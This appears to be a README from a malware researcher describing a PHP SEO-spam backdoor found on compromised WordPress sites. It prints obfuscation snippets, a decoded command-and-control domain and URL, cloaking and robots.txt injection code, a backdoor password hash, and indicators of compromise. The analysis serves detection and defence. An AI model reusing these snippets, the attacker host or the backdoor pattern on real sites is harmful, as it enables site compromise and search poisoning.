# 🛡️ PHP SEO Backdoor Malware – B676 Variant

> 🚨 **Disclaimer**: This repository is for **educational and research purposes only**. Do **not** deploy or use the code in any production environment. Malware is illegal and unethical to use maliciously. Learn responsibly.

---

## 📄 Overview

This repository documents a real-world PHP malware sample often used in search engine poisoning, SEO spam, and backdoor access. The script is found in compromised WordPress or shared hosting environments and is designed to cloak content, inject sitemaps, and communicate with a remote C2 (command-and-control) server.

The sample exhibits characteristics of:
- **SEO poisoning**
- **Remote code execution (RCE)**
- **Obfuscated communication with C2**
- **Bot detection & cloaking**
- **File injection (CSS, sitemap.xml, robots.txt)**
- **Persistence via stealth CSS payloads**

---

## 🧬 Malware Name Suggestions

- **B676 PHP Backdoor** (from internal comment `/* blog B676 */`)
- **PHP SEO Injector Shell**
- **Indexnew Web Shell**
- **ROT13 Cloaker Dropper**
- **Google Verification Faker**
- **C2-linked Sitemap Injector**

---

## 📂 Files in This Repo

| File                | Description                                    |
|---------------------|------------------------------------------------|
| `decoded_malware.php`     | Fully deobfuscated version of the malware      |
| `obfuscated.php` | Original obfuscated/encrypted malware sample |

---

## 🧪 Behavior Analysis

### 🔐 Initial Setup

```php
@set_time_limit(3600);
@ignore_user_abort(1);
```

- Prevents timeout and ensures the script runs even if user aborts the request.

---

### 🧅 Obfuscation

```php
$xmlname = '%73%6D%77%62%76%61%67%63%61%2E%70%6C%70%6E%79%7A%75%62%2E%66%76%67%72';
$goweb = str_rot13(urldecode($xmlname));
```

- `str_rot13` + `urldecode` used to hide the attacker-controlled C2 domain name.
- Final domain after decoding and ROT13: `fzjointpn.cycalmho.site`

---

### 📡 C2 Communication

```php
$web = $http_web . '://' . $goweb . '/indexnew.php';
```
- http://fzjointpn.cycalmho.site/indexnew.php

- The malware sends a POST request with victim information including:
  - Host
  - Request URI
  - Language
  - Referrer
  - Whether a CSS payload is loaded
  - Bot status (Googlebot, etc.)

- Receives instructions from attacker such as:
  - `okhtmlgetcontent` – Send back and display malicious HTML
  - `okxmlgetcontent` – Send back XML to spoof sitemap
  - `pingxmlgetcontent` – Ping sitemap URLs
  - `getcontent404page`, `500`, `301` – Send custom HTTP headers

---

### 🎭 Bot Cloaking

```php
function disbot() {
    $uAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    return stristr($uAgent, 'googlebot') || stristr($uAgent, 'bing') || ...;
}
```

- Detects bots like Googlebot or Bingbot.
- When bots are detected, serves fake or SEO-optimized content to poison search engine results.

---

### 🗺 Sitemap & Robots Injection

```php
file_put_contents("robots.txt", "Sitemap: http://victim.com/malicious.xml");
```

- Modifies `robots.txt` to insert a malicious sitemap.
- Attempts to manipulate search engine crawlers to index attacker-defined links and pages.

---

### 🔓 Password-Protected Backdoor

```php
$password = sha1(sha1(@$_REQUEST['pd']));
```

- Requires double-SHA1 hashed password to activate upload or overwrite functionalities.
- Hash for known backdoor access:  
  `f75fd5acd36a7fbd1e219b19881a5348bfc66e79`

- If matched:
  - Writes `.xml`, `.css`, `.html`, or any payload
  - Can upload verification files for fake Google ownership

---

### 🧬 CSS File Dropper

```php
fcss($dpath, $ps, $urlc);
```

- Downloads a stealth CSS payload from the attacker domain and stores it as:
  - `/css/xyzabc.css`
  - Or `/wp-includes/css/xyzabc.css`

- Filename is partially based on ROT13 and host hash.
- Later injected into fake HTML using `[##linkcss##]` placeholder.

---

## 🔍 Indicators of Compromise (IOCs)

| Indicator | Type |
|----------|------|
| `indexnew.php` | Remote C2 API |
| `robots.txt` with unexpected `Sitemap:` lines | SEO Hijacking |
| Strange `.css` files in `wp-includes/css/` | Payload Injection |
| Usage of `str_rot13`, `urldecode`, or `google-site-verification` in PHP | Obfuscation / SEO abuse |
| Backdoor SHA1 hash: `f75fd5acd36a7fbd1e219b19881a5348bfc66e79` | Backdoor password trigger |

---



---

## 📚 License

MIT License – for research, education, and awareness only.  
Absolutely **no support or tolerance for malicious use**.

---

## ✍️ Author / Researcher

**Hamza Haroon**  
Cybersecurity enthusiast, developer, and malware analyst  
Feel free to contribute improvements or analysis.
